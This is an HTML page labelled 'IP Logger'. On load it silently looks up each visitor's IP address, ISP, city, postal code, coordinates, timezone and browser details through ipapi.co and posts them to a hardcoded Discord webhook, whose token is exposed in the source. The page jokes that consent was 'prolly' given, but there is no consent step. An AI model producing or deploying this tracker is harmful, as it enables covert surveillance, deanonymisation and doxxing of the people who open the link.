<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cool</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #ffffff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 100px;
        }
        .container {
            background: #1a1a1a;
            border-radius: 12px;
            padding: 40px;
            display: inline-block;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>IP Logger</h1>
        <p>Your IP address and location have been logged (With consent prolly)</p>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1358595258878791891/lvOdRKLnfTeGJ3bBF6Rrlm8crKvZAqJ32MgTsMpxemNWuGsDJXPY2ccaA1TYxaBOx11H";

        // Get IP and geolocation data
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const city = data.city;
                const region = data.region;
                const country = data.country_name;
                const postal = data.postal;
                const timezone = data.timezone;
                const isp = data.org;
                const latitude = data.latitude;
                const longitude = data.longitude;

                const userAgent = navigator.userAgent;
                const language = navigator.language;
                const platform = navigator.platform;

                const payload = {
                    content: `**IP Log!** ðŸ“„
**IP Address:** ${ip}
**ISP:** ${isp}
**Location:** ${city}, ${region}, ${country} (${postal})
**Coordinates:** ${latitude}, ${longitude}
**Timezone:** ${timezone}
**Browser Info:** ${userAgent}
**Language:** ${language}
**Platform:** ${platform}`
                };

                fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            })
            .catch(error => console.error('Error fetching data:', error));
    </script>
</body>
</html>
